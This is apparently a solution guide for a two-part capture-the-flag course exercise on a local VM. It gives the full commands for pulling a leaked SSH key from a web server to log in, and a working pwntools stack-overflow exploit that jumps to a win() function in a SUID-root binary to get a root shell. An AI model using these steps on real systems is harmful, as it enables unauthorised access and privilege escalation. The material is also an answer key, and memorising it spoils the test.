# Testing and Solution Guide

## Problem 1: Gain Access

### Summary
Goal: Obtain an unprivileged shell as `p1` and extract the flag from the home directory.
Hint: Look for information leakage on a public server that helps you connect.

### Steps
1. Discover the leak via `robots.txt`:
```bash
curl http://localhost:8000/robots.txt
```
2. Download the leaked SSH key and fix permissions:
```bash
curl -o id_rsa http://localhost:8000/backup/id_rsa
chmod 600 id_rsa
```
3. SSH into the VM as `p1`:
```bash
ssh -i id_rsa -p 2222 p1@localhost
```
4. Generate submission files inside the VM:
```bash
ctf-extract
```
5. Package files for submission:
```bash
tar -czf 2022CSZ123456-P1.tar.gz flag.txt key.txt
```

## Problem 2: Become Super

### Summary
Goal: Exploit a SUID-root binary in `/home/p1/p2/p2` to get a root shell and extract the P2 flag.
Hint: Classic stack buffer overflow with a `win()` function.

### Checks (inside VM)
```bash
ls -l /home/p1/p2/p2
file /home/p1/p2/p2
nm -n /home/p1/p2/p2 | grep " win$"
```

### Find the offset (pwntools)
1. Generate a cyclic pattern and crash the program:
```bash
python3 - <<'PY' > /tmp/pat
from pwn import cyclic
print(cyclic(300, n=8).decode())
PY

gdb -q /home/p1/p2/p2
(gdb) run < /tmp/pat
(gdb) info registers pc
```
2. Compute the offset:
```bash
python3 - <<'PY'
from pwn import cyclic_find
# Replace with the PC value from gdb (example below uses the bytes shown in the run log)
pc_bytes = b"jaaaaaaa"
print(cyclic_find(pc_bytes, n=8))
PY
```

### Working exploit (interactive shell)
1. Create the payload (replace `offset` or `win` if needed):
```bash
python3 - <<'PY' > /tmp/payload
from pwn import p64
offset = 72
win = 0x400704
payload = b"A"*offset + p64(win) + b"\n"
import sys
sys.stdout.buffer.write(payload)
PY
```
2. Keep stdin open and interact:
```bash
cat /tmp/payload - | /home/p1/p2/p2
id
cat /root/flag_p2.txt
```

Expected output (example):
```text
uid=0(root) gid=0(root) groups=0(root),1001(p1)
<flag-value>
```

### Submission
```bash
ctf-extract P2
tar -czf 2022CSZ123456-P2.tar.gz flag.txt key.txt
```
Copy submission to host:
```bash
scp -P 2222 -i id_rsa p1@localhost:2022CSZ123456-P2.tar.gz .
```
